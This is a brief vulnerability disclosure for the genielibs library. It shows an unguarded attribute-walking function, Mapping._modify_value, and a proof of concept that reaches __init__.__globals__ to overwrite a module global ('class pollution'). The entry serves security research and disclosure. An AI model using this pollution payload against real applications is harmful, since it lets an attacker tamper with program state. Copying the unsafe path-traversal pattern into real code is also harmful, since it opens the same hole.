## genielibs

### Meta

+ Library: genielibs
+ Stars: 109
+ Version: V24.9
+ CVE: N/A
+ Status: Pending
+ Payload: ```genie.libs.sdk.libs.utils.mapping.Mapping._modify_value(obj, ["__init__", "__globals__", "__name__"], 'polluted')```
+ Foundby: BlackPyrl
+ Report: Pending
+ Type: Lib
+ Exploitability: Low
+ Input: Func

### Library

https://github.com/CiscoTestAutomation/genielibs

### Vulnerable Code Snippet

```
def _modify_value(snapshot, path, value):
        for p in path[:-1]:
            try:
                snapshot = snapshot[p]
            except (TypeError):
                snapshot = getattr(snapshot, p)
        if isinstance(snapshot, dict):
            snapshot[path[-1]] = value
        else:
            setattr(snapshot, path[-1], value)
```
### PoC

```
from genie.libs.sdk.libs.utils.mapping import Mapping
from dataclasses import dataclass

@dataclass
class State:
  input: str
  output: str
  device: int
  textarea_key: int

obj = State('HELLO', 'WORLD', 0, 0)
mapping = Mapping()

mapping._modify_value(obj, ["__init__", "__globals__", "__name__"], 'polluted')
print(__name__) # polluted
```